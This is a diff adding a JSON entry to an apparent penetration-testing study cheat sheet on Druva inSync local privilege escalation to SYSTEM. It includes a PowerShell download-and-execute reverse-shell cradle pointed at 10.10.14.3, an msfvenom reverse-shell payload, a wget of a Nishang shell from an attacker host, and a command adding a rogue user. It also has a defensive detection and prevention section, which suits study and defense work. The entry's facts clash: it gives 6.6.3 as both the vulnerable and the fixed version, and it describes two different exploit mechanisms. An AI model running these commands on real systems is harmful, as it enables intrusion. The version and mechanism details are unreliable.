@@ -1,0 +1,94 @@
+{
+  "type": "command",
+  "platform": "windows",
+  "requires": [
+    "local-access"
+  ],
+  "protocols": [],
+  "tools": [
+    "powershell"
+  ],
+  "tags": [
+    "named-pipe",
+    "local-service",
+    "path-traversal"
+  ],
+  "category": "Privilege Escalation",
+  "subcategory": "Windows - Vulnerable Services",
+  "certifications": [
+    "CPTS",
+    "OSCP"
+  ],
+  "primary_cert": "CPTS",
+  "source": "CPTS Module 26: Windows Privilege Escalation",
+  "examples": [
+    {
+      "label": "Find the local Druva port",
+      "command": "netstat -ano | findstr 6064"
+    },
+    {
+      "label": "Confirm the Druva service",
+      "command": "get-service | ? {$_.DisplayName -like 'Druva*'}"
+    },
+    {
+      "label": "PoC sends an RPC that runs your command as SYSTEM",
+      "command": "# $cmd = 'net user pwnd /add'  -> connects to 127.0.0.1:6064"
+    },
+    {
+      "label": "Swap in a reverse-shell command",
+      "command": "# $cmd = \"powershell IEX(New-Object Net.Webclient).downloadString('http://10.10.14.3:8080/shell.ps1')\""
+    }
+  ],
+  "notes": "=== Druva inSync — Local RPC Command Injection → SYSTEM ===\nThird-party backup software running as SYSTEM with no authentication on local RPC port.\n\n=== VULNERABILITY DETAILS ===\nDruva inSync Client Service: SYSTEM-level local service listening on 127.0.0.1:6064\nAccepts commands over raw TCP socket (no authentication required)\nPath traversal: intended to only execute binaries in own install directory\nC:\\ProgramData\\Druva\\inSync4\\..\\..\\..\\ traverses out to C:\\Windows\\System32\\\nAny local user can send commands → SYSTEM executes them\n\n=== DISCOVERY CHAIN ===\nStep 1: wmic product get name | findstr \"Druva\"  (confirms Druva inSync 6.6.3)\nStep 2: netstat -ano | findstr 6064  (confirms service listening on loopback)\nStep 3: Get-Process -Id <PID from Step 2>  (maps PID to process name)\nStep 4: Get-Service | Where-Object {$_.DisplayName -like \"*Druva*\"}  (confirms service running)\n\n=== ATTACK FLOW ===\nStage the reverse shell:\n  msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=4444 -f exe -o shell.exe\n  Transfer shell.exe to target (certutil, PowerShell DownloadFile, etc.)\n  Start listener: nc -lvnp 4444\n\nCreate shell.ps1 (Nishang Invoke-PowerShellTcp with invocation appended):\n  wget http://ATTACKER/Invoke-PowerShellTcp.ps1 -O shell.ps1\n  echo \"Invoke-PowerShellTcp -Reverse -IPAddress ATTACKER -Port 4444\" >> shell.ps1\n\nUse the PoC to execute via Druva:\n  The PowerShell PoC constructs a raw TCP message:\n    Header: inSync PHC RPCW[v0002]\n    Type identifier + length field + command payload\n  Command payload uses path traversal:\n    C:\\ProgramData\\Druva\\inSync4\\..\\..\\..\\Windows\\System32\\cmd.exe /c <command>\n  PoC sends this over TCP to 127.0.0.1:6064\n\n=== CHAINING CONTEXT ===\nwmic product enumeration → Druva 6.6.3 found → PoC execution → SYSTEM\nThis pattern (SYSTEM service + local RPC + no auth + path traversal) appears in many commercial tools\nPost-SYSTEM: LSASS dump, secretsdump, persistence\nLocally-bound services are often overlooked by defenders who focus on network-exposed services\n\n=== WHAT TO LOOK FOR ===\nwmic product get name → always run on every Windows foothold\nLocally-bound service ports (127.0.0.1 only) → not visible on network scans but locally exploitable\nCommercial backup/endpoint/security software = frequently underpatched SYSTEM-context services\nDruva 6.6.3 specifically documented; vendor released a patch in a later version",
+  "references": [
+    {
+      "title": "Druva inSync LPE (Exploit-DB 49211)",
+      "url": "https://www.exploit-db.com/exploits/49211"
+    },
+    {
+      "title": "HTB Academy - Windows Privilege Escalation",
+      "url": "https://academy.hackthebox.com/module/details/67"
+    },
+    {
+      "title": "OffSec PEN-200 (OSCP)",
+      "url": "https://www.offsec.com/courses/pen-200/"
+    }
+  ],
+  "recommended": [
+    {
+      "id": "winpe-named-pipes-enum",
+      "note": "Local-port/pipe enumeration that finds services like this.",
+      "rel": "prereq"
+    },
+    {
+      "id": "dll-hijacking",
+      "note": "Another vulnerable-service class on Windows.",
+      "rel": "alternative"
+    }
+  ],
+  "id": "druva-insync-poc",
+  "name": "Vulnerable Service - Druva inSync Local RPC",
+  "command": "# PowerShell PoC connects to 127.0.0.1:6064 and sends a crafted RPC that runs cmd.exe as SYSTEM",
+  "description": "Druva inSync's local RPC service (port 6064) runs as SYSTEM and executes a path-traversal-reachable cmd.exe with attacker-supplied arguments. Enumerate the listening port/PID/service, then run the PoC to add a user or catch a reverse shell.",
+  "opsec": "loud",
+  "mitre": [
+    "T1068"
+  ],
+  "exam": "exam-ok",
+  "defense": {
+    "why_it_works": "The Druva inSync client (versions prior to 6.6.3) listens on localhost port 6064 for API commands without authentication. The API endpoint accepts commands to restore files from backups to arbitrary local paths. A path traversal in the restore target combined with a file write allows executing arbitrary files as SYSTEM (the service runs as LocalSystem). A public PoC weaponizes this to run arbitrary commands.",
+    "prerequisites": "Druva inSync client installed and running (version < 6.6.3). Local shell access. Network access to 127.0.0.1:6064. PoC script available.",
+    "impact": "Arbitrary command execution as SYSTEM from a local user without privileges, enabling full system compromise from any local account.",
+    "detection": "Unusual connection to 127.0.0.1:6064. PoC script execution (PowerShell making HTTP requests to localhost:6064). Unexpected SYSTEM process execution related to Druva. Druva service spawning cmd.exe or PowerShell.",
+    "artifacts": "Network: local connection to port 6064 by non-Druva process | Process: Druva service spawning unexpected child process | PowerShell: web request to localhost:6064 from PoC",
+    "prevention": "Update Druva inSync to version 6.6.3 or later. Apply network firewall rules to restrict port 6064 to only Druva processes (Windows Firewall per-application rules). If Druva is not required, uninstall it.",
+    "misconfiguration": "Druva inSync client running on version < 6.6.3 without authentication on the local API endpoint. Port 6064 accessible to all local processes without restriction.",
+    "vulnerable_config": "# PoC sends command to Druva local API:\n$body = '{\"type\":\"restore\",\"guid\":\"...\",\"sourcePath\":\"...\",\"destPath\":\"C:\\\\Windows\\\\System32\\\\\",\"files\":[\"malicious.exe\"]}'\nInvoke-WebRequest -Uri http://127.0.0.1:6064/api -Method POST -Body $body\n# Druva (SYSTEM) restores malicious.exe to System32\n# Then trigger execution...",
+    "secure_config": "# Update Druva inSync:\n# Check version: Control Panel > Druva inSync\n# Update to >= 6.6.3\n\n# If immediate patch not possible:\n# Windows Firewall rule: block TCP 6064 for all processes except DruvaService.exe\nNew-NetFirewallRule -DisplayName 'Block Druva API abuse' -Direction Inbound -Protocol TCP -LocalPort 6064 -Action Block\n\n# Uninstall if not required",
+    "sources": [
+      "HTB M26",
+      "MITRE T1068",
+      "MITRE T1203"
+    ]
+  }
+}
